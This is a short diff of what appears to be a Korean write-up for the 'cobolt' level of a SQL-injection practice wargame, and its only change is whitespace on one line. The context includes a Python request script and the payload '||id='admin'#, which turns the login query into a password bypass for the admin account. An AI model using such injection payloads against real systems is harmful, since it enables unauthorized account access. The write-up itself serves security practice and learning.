@@ -30,7 +30,7 @@ res = requests.get(url, cookies=cookies, params=params)
 if "Clear" in res.text :
     print("[♪] COBOLT Clear!")
 ```
-1번 문제는 id의 존재만 확인했지만 이번 문제는 id가 admin이어야 한다.
+1번 문제는 id의 존재만 확인했지만 이번 문제는 id가 admin이어야 한다.  
 따라서 id에 **'||id='admin'#** 을 넣어주었다.
 ``` php
 select id from prob_cobolt where id=''||id='admin'#' and pw=''
